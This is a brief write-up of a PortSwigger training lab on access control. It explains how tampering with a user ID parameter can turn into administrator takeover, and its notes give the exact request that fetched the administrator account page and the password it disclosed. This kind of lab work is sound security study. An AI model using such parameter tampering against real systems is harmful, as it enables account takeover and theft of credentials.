# User ID controlled by request parameter with password disclosure

[Lab in PortSwigger](https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-password-disclosure)

## Definition
 Often, a horizontal privilege escalation attack can be turned into a vertical privilege escalation, by compromising a more privileged user. For example, a horizontal escalation might allow an attacker to reset or capture the password belonging to another user. If the attacker targets an administrative user and compromises their account, then they can gain administrative access and so perform vertical privilege escalation.

For example, an attacker might be able to gain access to another user's account page using the parameter tampering technique already described for horizontal privilege escalation: `https://insecure-website.com/myaccount?id=456`

If the target user is an application administrator, then the attacker will gain access to an administrative account page. This page might disclose the administrator's password or provide a means of changing it, or might provide direct access to privileged functionality. 

## Notes
Logged in as Wiener, request administrator account page:
```http
GET https://acf21fc61f3ff536c0aa2a1a004d00f9.web-security-academy.net/my-account?id=administrator
```
Password field value: `itxxruvra60hjefn3fkt`

## Key Words
> id, idor, userid